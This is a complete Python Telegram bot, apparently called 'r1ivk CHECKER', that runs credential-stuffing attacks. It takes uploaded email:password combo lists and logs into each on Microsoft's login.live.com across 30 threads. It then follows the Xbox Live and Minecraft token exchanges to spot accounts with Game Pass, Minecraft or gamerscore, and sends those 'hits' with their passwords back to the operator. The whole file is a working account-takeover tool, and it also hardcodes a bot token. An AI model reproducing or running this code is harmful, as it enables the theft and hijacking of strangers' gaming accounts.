# -*- coding: utf-8 -*-
"""
r1ivk CHECKER v4.0 - SIMPLE EDITION
Owner: r1ivk
"""

import os
import re
import io
import time
import zipfile
import threading
import requests
import urllib3
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import telebot
from telebot import types

urllib3.disable_warnings()

# =================== CONFIG ===================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8896382526:AAG7lmuFPHniEXHsMTBzLnw8cBqIf-wPK3w")
OWNER_ID  = int(os.environ.get("OWNER_ID", "6266959915"))

REQUEST_TIMEOUT = 25
MAX_THREADS     = 30
RESULTS_DIR     = "XBOX_RESULT"
os.makedirs(RESULTS_DIR, exist_ok=True)

# =================== BOT ===================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

# =================== SESSIONS ===================
user_sessions = {}
sessions_lock = threading.Lock()


def new_session(chat_id):
    return {
        "chat_id": chat_id,
        "is_running": False,
        "checked": 0,
        "total": 0,
        "hits": 0,
        "bad": 0,
        "twofa": 0,
        "errors": 0,
        "gamepass": 0,
        "minecraft": 0,
        "gscore": 0,
        "start_time": 0,
        "hits_buffer": [],
        "status_msg_id": None,
        "lock": threading.Lock(),
        "stop_flag": False,
        "paused": False,
    }


def get_session(chat_id):
    with sessions_lock:
        if chat_id not in user_sessions:
            user_sessions[chat_id] = new_session(chat_id)
        return user_sessions[chat_id]


# =================== TOKEN EXTRACTORS ===================
def extract_ppft(text):
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(1).replace('\\/', '/').replace('\\"', '"')
    return None


def extract_url_post(text):
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(1).replace('\\/', '/')
    return None


# =================== COMBO PARSER ===================
def parse_combo(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if ":" not in line:
        return None
    parts = line.split(":", 1)
    email = parts[0].strip()
    password = parts[1].strip()
    if not email or not password:
        return None
    return f"{email}:{password}"


def dedupe_combos(lines):
    seen = set()
    out = []
    for line in lines:
        c = parse_combo(line)
        if not c:
            continue
        email = c.split(":")[0].lower()
        if email in seen:
            continue
        seen.add(email)
        out.append(c)
    return out


# =================== CHECKER ===================
def check_account(combo, chat_id):
    s = get_session(chat_id)
    if s["stop_flag"]:
        return
    while s["paused"] and not s["stop_flag"]:
        time.sleep(1)

    parts = combo.split(":", 1)
    if len(parts) < 2:
        with s["lock"]:
            s["bad"] += 1
            s["checked"] += 1
        return

    email = parts[0].strip()
    password = parts[1].strip()

    session = requests.Session()
    session.verify = False
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
    })

    try:
        sftag_url = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        )
        resp = session.get(sftag_url, timeout=REQUEST_TIMEOUT)
        text = resp.text

        sftag = extract_ppft(text)
        url_post = extract_url_post(text)

        if not sftag or not url_post:
            with s["lock"]:
                s["bad"] += 1
                s["checked"] += 1
            session.close()
            return

        login_data = {
            "login": email,
            "loginfmt": email,
            "passwd": password,
            "PPFT": sftag,
            "type": "11",
            "NewUser": "1",
            "LoginOptions": "3",
            "i19": "0",
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": sftag_url,
            "Origin": "https://login.live.com",
        }
        login_req = session.post(
            url_post, data=login_data, headers=headers,
            allow_redirects=True, timeout=REQUEST_TIMEOUT
        )

        ms_token = None
        login_text = login_req.text.lower()

        if "access_token" in login_req.url:
            ms_token = parse_qs(urlparse(login_req.url).fragment).get("access_token", [None])[0]
        elif "access_token" in login_text:
            tm = re.search(r"access_token=([^&\s\"']+)", login_text)
            if tm:
                ms_token = tm.group(1)
        elif any(x in login_text for x in [
            "password is incorrect", "account doesn't exist",
            "passwords don't match", "that password is incorrect"
        ]):
            with s["lock"]:
                s["bad"] += 1
                s["checked"] += 1
            session.close()
            return
        elif any(x in login_text for x in [
            "recover", "identity/confirm", "locked", "help us protect",
            "verify your identity", "security challenge", "two-step"
        ]):
            with s["lock"]:
                s["twofa"] += 1
                s["checked"] += 1
            session.close()
            return

        if not ms_token:
            with s["lock"]:
                s["bad"] += 1
                s["checked"] += 1
            session.close()
            return

        # Xbox Live Auth
        xb_payload = {
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName": "user.auth.xboxlive.com",
                "RpsTicket": ms_token,
            },
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT",
        }
        xb_headers = {"Content-Type": "application/json", "Accept": "application/json"}
        xb_req = session.post(
            "https://user.auth.xboxlive.com/user/authenticate",
            json=xb_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT
        )

        if xb_req.status_code != 200:
            with s["lock"]:
                s["bad"] += 1
                s["checked"] += 1
            session.close()
            return

        xb_token = xb_req.json()["Token"]
        uhs = xb_req.json()["DisplayClaims"]["xui"][0]["uhs"]

        # Gamertag + Gamerscore
        gamertag = "N/A"
        gamerscore = "0"
        gscore_int = 0

        try:
            xsts_xb_payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
                "RelyingParty": "http://xboxlive.com",
                "TokenType": "JWT",
            }
            xsts_xb_req = session.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json=xsts_xb_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT
            )
            if xsts_xb_req.status_code == 200:
                xsts_xb_token = xsts_xb_req.json()["Token"]
                prof_req = session.get(
                    "https://profile.xboxlive.com/users/me/profile/settings"
                    "?settings=Gamertag,Gamerscore",
                    headers={
                        "Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}",
                        "x-xbl-contract-version": "2",
                    },
                    timeout=REQUEST_TIMEOUT,
                )
                if prof_req.status_code == 200:
                    settings = prof_req.json().get("profileUsers", [{}])[0].get("settings", [])
                    for st in settings:
                        if st["id"] == "Gamertag":
                            gamertag = st["value"]
                        if st["id"] == "Gamerscore":
                            gamerscore = st["value"]
                            try:
                                gscore_int = int(gamerscore)
                            except:
                                gscore_int = 0
        except:
            pass

        # Minecraft Entitlements
        has_gp = False
        has_mc = False
        gp_type = ""
        mc_ent_text = ""

        try:
            xsts_mc_payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT",
            }
            xsts_mc_req = session.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json=xsts_mc_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT
            )
            if xsts_mc_req.status_code == 200:
                xsts_mc_token = xsts_mc_req.json()["Token"]
                mc_auth = session.post(
                    "https://api.minecraftservices.com/authentication/login_with_xbox",
                    json={"identityToken": f"XBL3.0 x={uhs};{xsts_mc_token}"},
                    headers={"Content-Type": "application/json"},
                    timeout=REQUEST_TIMEOUT,
                )
                if mc_auth.status_code == 200:
                    mc_token = mc_auth.json().get("access_token")
                    if mc_token:
                        ent_req = session.get(
                            "https://api.minecraftservices.com/entitlements/mcstore",
                            headers={"Authorization": f"Bearer {mc_token}"},
                            timeout=REQUEST_TIMEOUT,
                        )
                        if ent_req.status_code == 200:
                            mc_ent_text = ent_req.text
        except:
            pass

        if "product_game_pass_ultimate" in mc_ent_text:
            gp_type, has_gp = "Game Pass Ultimate", True
        elif "product_game_pass_pc" in mc_ent_text:
            gp_type, has_gp = "PC Game Pass", True
        elif "product_game_pass_console" in mc_ent_text:
            gp_type, has_gp = "Xbox Game Pass Console", True

        has_mc = "product_minecraft" in mc_ent_text

        hit_content = (
            f"Email: {email}\n"
            f"Password: {password}\n"
            f"Gamertag: {gamertag}\n"
            f"Gamerscore: {gamerscore}\n"
            f"Minecraft: {'Yes' if has_mc else 'No'}\n"
            f"Game Pass: {gp_type if has_gp else 'No'}"
        )

        with s["lock"]:
            if has_gp:
                s["gamepass"] += 1
                s["hits"] += 1
                s["hits_buffer"].append(("gamepass", hit_content))
                try:
                    bot.send_message(
                        s["chat_id"],
                        f"🔥 *GAME PASS HIT!* 🔥\n```\n{hit_content}\n```"
                    )
                except:
                    pass
            elif has_mc:
                s["minecraft"] += 1
                s["hits"] += 1
                s["hits_buffer"].append(("minecraft", hit_content))
            elif gscore_int > 0:
                s["gscore"] += 1
                s["hits"] += 1
                s["hits_buffer"].append(("gscore", hit_content))
            else:
                s["bad"] += 1
            s["checked"] += 1

        session.close()

    except requests.exceptions.RequestException:
        with s["lock"]:
            s["errors"] += 1
            s["checked"] += 1
        try:
            session.close()
        except:
            pass
    except Exception:
        with s["lock"]:
            s["errors"] += 1
            s["checked"] += 1
        try:
            session.close()
        except:
            pass


# =================== LIVE SCANNER ===================
def live_scanner(chat_id, combos, threads=MAX_THREADS):
    s = get_session(chat_id)
    s["stop_flag"] = False
    s["paused"] = False

    q_lock = threading.Lock()
    idx = {"i": 0}

    def worker():
        while True:
            with q_lock:
                if s["stop_flag"] or idx["i"] >= len(combos):
                    return
                combo = combos[idx["i"]]
                idx["i"] += 1
            check_account(combo, chat_id)

    workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in workers:
        t.start()

    last_render = 0
    while any(t.is_alive() for t in workers):
        if s["stop_flag"]:
            break
        if time.time() - last_render >= 4:
            render_status(chat_id)
            last_render = time.time()
        time.sleep(1)

    for t in workers:
        t.join(timeout=1)

    s["is_running"] = False
    render_status(chat_id, final=True)

    try:
        summary = (
            f"🏁 *r1ivk CHECKER — FINAL REPORT*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Checked: `{s['checked']}/{s['total']}`\n"
            f"✅ Hits: `{s['hits']}`\n"
            f"🎮 GamePass: `{s['gamepass']}`\n"
            f"⛏ Minecraft: `{s['minecraft']}`\n"
            f"🏆 G-Score: `{s['gscore']}`\n"
            f"❌ Bad: `{s['bad']}`\n"
            f"🔒 2FA: `{s['twofa']}`\n"
            f"⚠️ Errors: `{s['errors']}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Use /hits to receive files 📤"
        )
        bot.send_message(chat_id, summary)
    except:
        pass


def render_status(chat_id, final=False):
    s = get_session(chat_id)
    elapsed = time.time() - s["start_time"] if s["start_time"] else 1
    cpm = int((s["checked"] / elapsed) * 60) if elapsed > 2 else 0
    pct = (s["checked"] / s["total"] * 100) if s["total"] else 0
    bar = "█" * int(pct / 5) + "░" * (20 - int(pct / 5))

    text = (
        f"⚡ *r1ivk CHECKER* ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Progress: `{s['checked']}/{s['total']}`\n"
        f"`[{bar}]` *{pct:.1f}%*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Hits: `{s['hits']}`\n"
        f"🎮 GamePass: `{s['gamepass']}`\n"
        f"⛏ Minecraft: `{s['minecraft']}`\n"
        f"🏆 G-Score: `{s['gscore']}`\n"
        f"❌ Bad: `{s['bad']}`\n"
        f"🔒 2FA: `{s['twofa']}`\n"
        f"⚠️ Errors: `{s['errors']}`\n"
        f"🚀 CPM: `{cpm}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{'🏁 Finished!' if final else '⏳ Running...'}"
    )

    kb = None
    if not final:
        kb = types.InlineKeyboardMarkup(row_width=3)
        kb.add(
            types.InlineKeyboardButton("⏸ Pause", callback_data="pause"),
            types.InlineKeyboardButton("▶ Resume", callback_data="resume"),
            types.InlineKeyboardButton("🛑 Stop", callback_data="stop"),
        )

    try:
        if s["status_msg_id"]:
            bot.edit_message_text(text, chat_id, s["status_msg_id"], reply_markup=kb)
        else:
            m = bot.send_message(chat_id, text, reply_markup=kb)
            s["status_msg_id"] = m.message_id
    except:
        pass


# =================== KEYBOARD ===================
def main_menu_kb():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add("📁 Scan File", "📝 Single Combo")
    kb.add("📊 Stats", "📤 Get Hits")
    return kb


# =================== HANDLERS ===================
@bot.message_handler(commands=["start"])
def cmd_start(msg):
    chat_id = msg.chat.id
    txt = (
        f"⚡ *r1ivk CHECKER v4.0* ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: @{msg.from_user.username or 'N/A'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔹 *Commands:*\n"
        f"`/check email:pass` — Single combo\n"
        f"`/file` — Upload combo file\n"
        f"`/stop` — Stop scan\n"
        f"`/stats` — Statistics\n"
        f"`/hits` — Receive hits\n"
        f"`/reset` — Reset session\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Owner: r1ivk"
    )
    bot.send_message(chat_id, txt, reply_markup=main_menu_kb())


@bot.message_handler(commands=["help"])
def cmd_help(msg):
    cmd_start(msg)


@bot.message_handler(func=lambda m: m.text == "📁 Scan File")
def btn_scan_file(msg):
    bot.reply_to(msg, "📁 Send a `.txt` file with combos (one per line)")


@bot.message_handler(func=lambda m: m.text == "📝 Single Combo")
def btn_single(msg):
    bot.reply_to(msg, "📝 Send: `/check email:pass`")


@bot.message_handler(func=lambda m: m.text == "📊 Stats")
def btn_stats(msg):
    cmd_stats(msg)


@bot.message_handler(func=lambda m: m.text == "📤 Get Hits")
def btn_hits(msg):
    cmd_hits(msg)


@bot.message_handler(commands=["check"])
def cmd_check(msg):
    chat_id = msg.chat.id
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(msg, "❌ Usage: `/check email:pass`")
        return

    combo = parse_combo(args[1])
    if not combo:
        bot.reply_to(msg, "❌ Invalid format")
        return

    s = get_session(chat_id)
    s.update({
        "stop_flag": False, "paused": False, "is_running": True,
        "start_time": time.time(), "total": 1,
        "checked": 0, "hits": 0, "bad": 0, "twofa": 0, "errors": 0,
        "gamepass": 0, "minecraft": 0, "gscore": 0,
        "hits_buffer": [], "status_msg_id": None,
    })
    threading.Thread(
        target=live_scanner, args=(chat_id, [combo], 1), daemon=True
    ).start()


@bot.message_handler(commands=["file"])
def cmd_file(msg):
    bot.reply_to(msg, "📁 Send the combo file (.txt) now")


@bot.message_handler(content_types=["document"])
def handle_doc(msg):
    chat_id = msg.chat.id

    if not msg.document.file_name.lower().endswith((".txt", ".csv")):
        bot.reply_to(msg, "❌ File must be .txt or .csv")
        return

    try:
        fi = bot.get_file(msg.document.file_id)
        data = bot.download_file(fi.file_path).decode("utf-8", errors="ignore")
    except Exception as e:
        bot.reply_to(msg, f"❌ Failed to download: {e}")
        return

    combos = dedupe_combos(data.splitlines())
    if not combos:
        bot.reply_to(msg, "❌ File is empty or invalid")
        return

    s = get_session(chat_id)
    s.update({
        "stop_flag": False, "paused": False, "is_running": True,
        "start_time": time.time(), "total": len(combos),
        "checked": 0, "hits": 0, "bad": 0, "twofa": 0, "errors": 0,
        "gamepass": 0, "minecraft": 0, "gscore": 0,
        "hits_buffer": [], "status_msg_id": None,
    })

    bot.reply_to(
        msg,
        f"🚀 *Scan started* — `{len(combos)}` combos\n"
        f"Use /stop to stop."
    )

    threading.Thread(
        target=live_scanner, args=(chat_id, combos, MAX_THREADS), daemon=True
    ).start()


@bot.message_handler(commands=["stop"])
def cmd_stop(msg):
    chat_id = msg.chat.id
    s = get_session(chat_id)
    if not s["is_running"]:
        bot.reply_to(msg, "⚠️ No scan running.")
        return
    s["stop_flag"] = True
    s["is_running"] = False
    bot.reply_to(msg, "🛑 *Stopped.*")


@bot.message_handler(commands=["pause"])
def cmd_pause(msg):
    chat_id = msg.chat.id
    s = get_session(chat_id)
    if not s["is_running"]:
        bot.reply_to(msg, "⚠️ No scan running.")
        return
    s["paused"] = True
    bot.reply_to(msg, "⏸ *Paused.*")


@bot.message_handler(commands=["resume"])
def cmd_resume(msg):
    chat_id = msg.chat.id
    s = get_session(chat_id)
    if not s["is_running"]:
        bot.reply_to(msg, "⚠️ No scan running.")
        return
    s["paused"] = False
    bot.reply_to(msg, "▶ *Resumed.*")


@bot.message_handler(commands=["stats"])
def cmd_stats(msg):
    chat_id = msg.chat.id
    s = get_session(chat_id)
    elapsed = time.time() - s["start_time"] if s["start_time"] else 1
    cpm = int((s["checked"] / elapsed) * 60) if elapsed > 2 else 0

    txt = (
        f"📊 *Statistics*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔍 Checked: `{s['checked']}/{s['total']}`\n"
        f"✅ Hits: `{s['hits']}`\n"
        f"🎮 GamePass: `{s['gamepass']}`\n"
        f"⛏ Minecraft: `{s['minecraft']}`\n"
        f"🏆 G-Score: `{s['gscore']}`\n"
        f"❌ Bad: `{s['bad']}`\n"
        f"🔒 2FA: `{s['twofa']}`\n"
        f"⚠️ Errors: `{s['errors']}`\n"
        f"🚀 CPM: `{cpm}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(chat_id, txt)


@bot.message_handler(commands=["reset"])
def cmd_reset(msg):
    chat_id = msg.chat.id
    with sessions_lock:
        if chat_id in user_sessions:
            del user_sessions[chat_id]
    bot.reply_to(msg, "🧹 *Session reset.*")


@bot.message_handler(commands=["hits"])
def cmd_hits(msg):
    chat_id = msg.chat.id
    s = get_session(chat_id)

    if not s["hits_buffer"]:
        bot.reply_to(msg, "❌ No hits in this session.")
        return

    gp = [c for t, c in s["hits_buffer"] if t == "gamepass"]
    mc = [c for t, c in s["hits_buffer"] if t == "minecraft"]
    gs = [c for t, c in s["hits_buffer"] if t == "gscore"]

    def send_block(title, lst, fname):
        if not lst:
            return
        content = "\n" + "_" * 57 + "\n".join(lst)
        content = f"# {title} - r1ivk CHECKER\n\n" + content
        path = os.path.join(RESULTS_DIR, fname)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        with open(path, "rb") as f:
            bot.send_document(chat_id, f, caption=f"📤 *{title}* — `{len(lst)}` accounts")

    send_block("GAME PASS HITS", gp, "GamePass_Hits.txt")
    send_block("MINECRAFT HITS", mc, "Minecraft_Hits.txt")
    send_block("G-SCORE HITS", gs, "GScore_Hits.txt")

    if not (gp or mc or gs):
        bot.reply_to(msg, "❌ No real hits (only bad/2FA).")


@bot.callback_query_handler(func=lambda c: c.data in ("pause", "resume", "stop"))
def cb_controls(call):
    chat_id = call.message.chat.id
    s = get_session(chat_id)

    if call.data == "pause":
        s["paused"] = True
        bot.answer_callback_query(call.id, "⏸ Paused")
    elif call.data == "resume":
        s["paused"] = False
        bot.answer_callback_query(call.id, "▶ Resumed")
    elif call.data == "stop":
        s["stop_flag"] = True
        s["is_running"] = False
        bot.answer_callback_query(call.id, "🛑 Stopping...")


@bot.message_handler(func=lambda m: True)
def fallback(msg):
    bot.reply_to(msg, "🤖 Use /start to see commands.")


# =================== RUN ===================
if __name__ == "__main__":
    print("⚡ r1ivk CHECKER v4.0 is running...")
    bot.infinity_polling(timeout=30, long_polling_timeout=30)
